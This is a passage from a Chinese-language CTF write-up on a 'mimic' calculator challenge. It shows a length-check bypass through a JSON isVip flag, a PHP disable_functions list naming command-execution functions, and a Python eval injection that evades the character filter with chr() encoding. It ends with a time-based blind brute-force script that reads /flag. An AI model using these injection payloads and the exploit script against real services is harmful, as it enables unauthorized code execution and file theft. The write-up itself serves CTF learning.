    rop64 += pack(' {
fuzz的时候发现是有过滤的，表达式的输入过滤在 **expression.validator.ts**
，首先检查了输入长度，然后再检查输入内容，过滤大部分的命令执行需要用到的字符。
    export function ExpressionValidator(property: number, validationOptions?: ValidationOptions) {
       return (object: Object, propertyName: string) => {
            registerDecorator({
                name: 'ExpressionValidator',
                target: object.constructor,
                propertyName,
                constraints: [property],
                options: validationOptions,
                validator: {
                    validate(value: any, args: ValidationArguments) {
                      const str = value ? value.toString() : '';
                      if (str.length === 0) {
                        return false;
                      }
                      if (!(args.object as CalculateModel).isVip) {
                        if (str.length >= args.constraints[0]) {
                          return false;
                        }
                      }
                      if (!/^[0-9a-z\[\]\(\)\+\-\*\/ \t]+$/i.test(str)) { 
                        return false;
                      }
                      return true;
                    },
                },
            });
       };
    }
默认参数在 **calculate.model.ts** ，默认输入最大长度为15，`isVip`默认是`false`
    export default class CalculateModel {
      @IsNotEmpty()
      @ExpressionValidator(15, {
        message: 'Invalid input',
      })
      public readonly expression: string;
      @IsBoolean()
      public readonly isVip: boolean = false;
    }
那么长度限制可以通过，修改发送数据的类型进行绕过。提交json参数，修改`isVip`为`true`，Content-Type修改为`application/json`，这样可以跳过长度判断的语句。
flag在根目录，下一步需要考虑的是如何进行命令注入，由于nodejs不太熟悉，先看一下php和python。
php的决策器主函数 **index.php**
    expression . ';');
    echo MongoDB\BSON\fromPHP(['ret' => (string) $ret]);
**linit.ini** 中限制了大量执行命令的函数，暂时想不到绕过的姿势
    disable_functions = set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log
    max_execution_time = 1
再看一下python的决策器主函数 **app.py** ，也是使用`eval`进行计算
    @app.route("/", methods=["POST"])
    def calculate():
        data = request.get_data()
        expr = bson.BSON(data).decode()
        return bson.BSON.encode({
          "ret": str(eval(str(expr['expression'])))
        })
python可以用`+`进行字符串拼接，字符过滤可以用ascii编码绕过，绕过方法如下：
    >>> eval(chr(0x31)+chr(0x2b)+chr(0x31)) # 1+1
    2
由于python的代码在php和nodejs中都是无法运行的，决策器的验证是不可能通过，因此不会有正常结果回显。虽然不会显示命令注入的回显，但是返回结果会等所有决策器返回运行结果后才发送响应包，因此可以使用时间盲注，逐字符进行爆破flag。
注入payload：`__import__("time").sleep(2) if open("/flag").read()[0]=='f' else 1`
决策器的返回结果，其中python决策器是第二个，从返回结果可以看到，可以使用布尔注入。
    [Nest] 16   - 06/16/2019, 7:11 AM   [AppController] Ret = [{"ret":"timeout"},{"ret":"1"},"Request failed with status code 500"]    # False
    [Nest] 16   - 06/16/2019, 7:11 AM   [AppController] Ret = [{"ret":"timeout"},{"ret":"None"},"Request failed with status code 500"] # True
简单编写暴力爆破exp，提高效率也可以使用二分法爆破。
    # -*- coding:utf-8 -*-    import requests
    import json
    import string
    header = {
    "Content-Type":"application/json"}
    url = "http://x.x.x.x:50004/calculate"
    def foo(payload):
        return "+".join(["chr(%d)"%ord(x) for x in payload])
    flag = ''
    for i in range(20):
        for j in string.letters + string.digits + '{_}':
            exp = "__import__('time').sleep(3) if open('/flag').read()[%d]=='%s' else 1"%(i,j)
            data = {
                "expression": "eval(" + foo(exp) + ")",
                "isVip":True
            }
            try:
                r = requests.post(headers=header,url=url,data=json.dumps(data),timeout=2)
                #print r.elapsed
            except:
                flag += j
                print "[+] flag:",flag
                break
## 总结
拟态型的题目相信之后的比赛会更多的出现，这两题算是小试牛刀吧，期待之后比赛遇到的新题目。